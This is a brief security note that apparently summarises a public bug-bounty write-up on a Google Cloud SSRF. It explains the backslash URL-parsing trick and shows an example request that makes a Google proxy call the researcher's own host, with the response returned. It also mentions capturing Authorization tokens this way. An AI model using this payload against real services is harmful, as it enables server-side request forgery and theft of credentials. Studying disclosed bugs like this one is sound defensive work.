---
publish: true
---
# URL Backslash Trick

Summarised from [Fixing the Unfixable: Story of a Google Cloud SSRF](https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/)

> In short, the _backslash-trick_ relies on exploiting a minor difference between two “URL” specifications: the [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing), and [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). RFC3986 is a generic, multi-purpose specification for the syntax of _Uniform Resource Identifiers_, while the WHATWG URL Standard is specifically aimed at the Web, and at URLs (which are a subset of URIs). Modern browsers implement the WHATWG URL Standard.

![](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg)

Example: 

```http
GET /proxy?url=https://sfmnev.vps.xdavidhu.me\@jobs.googleapis.com/ HTTP/1.1
Host: cxl-services.appspot.com
```

```http
HTTP/1.1 200 OK
Cache-Control: no-cache
Access-Control-Allow-Origin: *
Content-Type: text/plain; charset=utf-8
X-Cloud-Trace-Context: fa8cf39a9e7d74e14772efe215f180c1
Date: Mon, 23 Mar 2020 21:28:07 GMT
Server: Google Frontend
Content-Length: 35

Hello from xdavidhu's webserver! :)
```

![](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/exploit.jpg)

> Setting my simple [Python HTTPS server](https://gist.github.com/xdavidhu/9491a9918b4dfbaffb789a8b9f2d1672)into `--verbose` mode, and making `cxl-services` request it once again allowed me to see the whole request going to my webserver, including all of the headers

Once a server is tricked into making a request to your server, you can see what it is appending such as Authorization headers.

Such a token may be able to access other internal resources.